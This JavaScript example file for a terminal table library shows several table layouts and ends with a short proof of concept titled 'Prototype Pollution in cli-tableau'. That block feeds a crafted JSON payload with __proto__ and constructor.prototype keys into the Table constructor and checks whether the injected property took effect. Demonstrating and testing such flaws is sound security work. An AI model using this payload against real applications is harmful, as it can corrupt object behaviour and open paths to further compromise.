/**
 * Module requirements.
 */

var Table = require("../lib");

/**
 * Example.
 */

/* col widths */
var table = new Table({
  head: ["Rel", "Change", "By", "When"],
  colWidths: [6, 21, 25, 17],
});

table.push(
  ["v0.1", "Testing something cool", "rauchg@gmail.com", "7 minutes ago"],
  ["v0.1", "Testing something cool", "rauchg@gmail.com", "8 minutes ago"]
);

console.log(table.toString());

/* compact */
var table2 = new Table({
  head: ["Rel", "Change", "By", "When"],
  colWidths: [6, 21, 25, 17],
  style: { compact: true, "padding-left": 1 },
});

table2.push(
  ["v0.1", "Testing something cool", "rauchg@gmail.com", "7 minutes ago"],
  ["v0.1", "Testing something cool", "rauchg@gmail.com", "8 minutes ago"],
  [],
  ["v0.1", "Testing something cool", "rauchg@gmail.com", "8 minutes ago"]
);

console.log(table.toString());

/* headless */
var headlessTable = new Table();
headlessTable.push([
  "v0.1",
  "Testing something cool",
  "rauchg@gmail.com",
  "7 minutes ago",
]);
console.log(headlessTable.toString());

/* vertical */
var verticalTable = new Table();
verticalTable.push(
  { "Some Key": "Some Value" },
  { "Another much longer key": "And its corresponding longer value" }
);

console.log(verticalTable.toString());

/* cross */
var crossTable = new Table({ head: ["", "Header #1", "Header #2"] });
crossTable.push(
  { "Header #3": ["Value 1", "Value 2"] },
  { "Header #4": ["Value 3", "Value 4"] }
);
console.log(crossTable.toString());

/* Prototype Pollution in cli-tableau */
let attackerObject =
  '{"__proto__":{"attackerControlledValue":"Attackers Payload"},"proto":{"attackPropFromProto":"changed"},"constructor":{"prototype":{"attackPropFromConstructorProto":"changed"}}}';

let attackedTable = new Table(JSON.parse(attackerObject));

attackedTable.push({
  Vulnerability: [
    "Prototype Pollution",
    !!attackedTable.options.attackerControlledValue,
  ],
});

console.log(attackedTable.toString());
